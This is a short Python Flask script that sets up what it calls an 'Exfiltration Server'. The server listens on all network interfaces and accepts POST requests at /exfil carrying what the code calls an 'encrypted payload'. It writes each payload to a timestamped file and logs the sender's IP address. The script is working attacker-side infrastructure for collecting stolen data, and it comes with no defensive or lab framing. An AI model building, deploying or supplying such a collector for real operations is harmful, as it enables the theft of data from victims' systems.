from flask import Flask, request
import datetime
import os

app = Flask(__name__)

# Create directory for logs if not present
RECEIVED_LOG_DIR = "exfil_received_logs"
os.makedirs(RECEIVED_LOG_DIR, exist_ok=True)

# Root route to verify server status
@app.route("/", methods=["GET"])
def home():
    return "🔐 Exfiltration Server is active. Awaiting POST requests at /exfil", 200

# Exfiltration endpoint supporting GET (for testing) and POST (for data)
@app.route("/exfil", methods=["GET", "POST"])
def receive_data():
    if request.method == "POST":
        payload = request.data
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        source_ip = request.remote_addr
        payload_size = len(payload)

        print(f"[INFO] [{timestamp}] Received {payload_size} bytes from {source_ip}")

        filename = os.path.join(RECEIVED_LOG_DIR, f"payload_{timestamp}.bin")
        with open(filename, "wb") as f:
            f.write(b"===== PAYLOAD START =====\n")
            f.write(f"[{timestamp}] From: {source_ip}\n".encode())
            f.write(payload)
            f.write(b"\n===== PAYLOAD END =====\n")

        # Optional logging
        with open(os.path.join(RECEIVED_LOG_DIR, "exfil_log.txt"), "a") as log:
            log.write(f"[INFO] [{timestamp}] Received {payload_size} bytes from {source_ip}\n")

        return "Payload received", 200
    else:
        # GET method: friendly message for browser/testing
        return "Send a POST request with encrypted payload to /exfil", 200

if __name__ == "__main__":
    # Run on all interfaces so you can connect remotely
    app.run(host="0.0.0.0", port=5000)
